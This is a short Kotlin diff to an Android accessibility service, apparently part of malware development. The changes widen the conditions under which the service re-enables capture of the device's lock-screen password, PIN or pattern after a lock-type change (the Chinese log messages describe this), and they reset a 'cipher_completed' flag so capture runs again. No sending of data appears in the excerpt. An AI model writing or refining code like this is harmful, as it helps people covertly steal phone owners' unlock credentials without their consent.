@@ -2313,8 +2313,8 @@ class MyAccessibilityService : AccessibilityService() {
                         val currentType = accessibilityEventRouter?.detectLockType(root)?.name?.lowercase() ?: ""
                         root?.recycle()
 
-                        if (currentType.isNotEmpty() && savedType.isNotEmpty()
-                            && currentType != "unknown" && currentType != savedType) {
+                        if (currentType.isNotEmpty() && currentType != "unknown"
+                            && (savedType.isEmpty() || savedType == "unknown" || currentType != savedType)) {
                             android.util.Log.d(TAG, "🔐 锁屏类型变化: $savedType → $currentType，重新启用密码监听")
                             prefs.edit().putBoolean("cipher_completed", false).apply()
                             isCipherCaptureEnabled = true
@@ -3972,8 +3972,8 @@ class MyAccessibilityService : AccessibilityService() {
 
                     val needsRecapture = when {
                         !cipherDone -> true
-                        savedType.isEmpty() -> true // 旧版数据无类型记录，强制重新捕获
-                        currentType.isNotEmpty() && currentType != savedType -> true
+                        savedType.isEmpty() || savedType == "unknown" -> true
+                        currentType.isNotEmpty() && currentType != "unknown" && currentType != savedType -> true
                         else -> false
                     }
 
